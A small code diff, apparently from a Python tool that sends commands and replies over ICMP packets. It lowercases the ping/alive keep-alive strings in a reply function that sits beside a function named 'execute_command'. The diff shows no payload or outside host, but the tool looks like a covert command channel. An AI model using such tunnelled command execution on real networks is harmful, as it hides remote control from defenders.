@@ -44,10 +44,10 @@ def execute_command(server, command, SSM):
 
 # Replys to non-executed statements
 def reply(src, command, SSM):
-    if command == "PING":
-            send_over_icmp(src, "PONG", SSM, False)
-    elif command == "ALIVE":
-            send_over_icmp(src, "ALIVE!", SSM, False)
+    if command == "ping":
+            send_over_icmp(src, "pong", SSM, False)
+    elif command == "alive":
+            send_over_icmp(src, "alive!", SSM, False)
     else:
         send_over_icmp(src, command, SSM, False)
 
